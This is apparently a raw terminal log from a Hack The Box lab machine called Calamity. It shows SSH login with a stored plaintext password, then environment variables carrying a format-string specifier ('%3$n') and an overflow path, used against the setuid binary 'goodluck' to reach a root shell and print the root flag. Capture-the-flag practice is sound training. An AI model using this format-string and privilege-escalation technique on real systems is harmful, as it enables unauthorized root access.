root@parrot:~/hackthebox/calamity# cat xalvas-files/ssh_password                
username : xalvas                       
password : 18547936..*                  
root@parrot:~/hackthebox/calamity# ssh xalvas@10.10.10.27                       
xalvas@10.10.10.27's password:          
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)                 

 * Documentation:  https://help.ubuntu.com                                      
 * Management:     https://landscape.canonical.com                              
 * Support:        https://ubuntu.com/advantage                                 

9 packages can be updated.              
8 updates are security updates.         


Last login: Wed Jan 15 06:11:56 2020 from 10.10.14.14                           
xalvas@calamity:~$ clear                
xalvas@calamity:~$ cd /home/xalvas/app/ 
xalvas@calamity:~/app$ ls               
goodluck  src.c                         
xalvas@calamity:~/app$ export LOGNAME=%3\$n                                     
xalvas@calamity:~/app$ export SSH_CONNECTION=/tmp/rs/wrapper12345678912345678   
xalvas@calamity:~/app$ ^^C              
xalvas@calamity:~/app$ ^C               
xalvas@calamity:~/app$ ^C               
xalvas@calamity:~/app$ ./goodluck       

Filename:  /tmp/rs/f1                   


        -----MENU-----                  
1) leave message to admin               
2) print session ID                     
3)login (admin only)                    
4)change user                           
5)exit                                  

 action: 2                              

debug info: 0x1035935                   


        -----MENU-----                  
1) leave message to admin               
2) print session ID                     
3)login (admin only)                    
4)change user                           
5)exit                                  

 action: 4                              

Filename:  /tmp/rs/f2                   


        -----MENU-----                  
1) leave message to admin               
2) print session ID                     
3)login (admin only)                    
4)change user                           
5)exit                                  

 action: 3                              

this function is problematic on purpose 

I'm trying to test some things...and that means get control of the program!     
vulnerable pointer is at bffff5e0       
memory information on this binary:      

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck      
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck      
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck      
80004000-80025000 rw-p 00000000 00:00 0          [heap]                         
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so                                                                               
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so                                                                               
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so                                                                               
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so                                                                               
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so                                                                               
b7fcd000-b7fd0000 rw-p 00000000 00:00 0                                         
b7fd6000-b7fd8000 rw-p 00000000 00:00 0                                         
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]                         
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]                         
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so 
b7ffd000-b7ffe000 rw-p 00000000 00:00 0                                         
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so 
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so 
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]                        



Filename:  /tmp/rs/payload              
# id                                    
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(xalvas)                                  
# cd /root                              
# ls                                    
peda  root.txt  scr                     
# cat root.tt                           
cat: root.tt: No such file or directory 
# cat root.txt                          
9be653e014d17d1a54f9045e3220743c        
#                                       
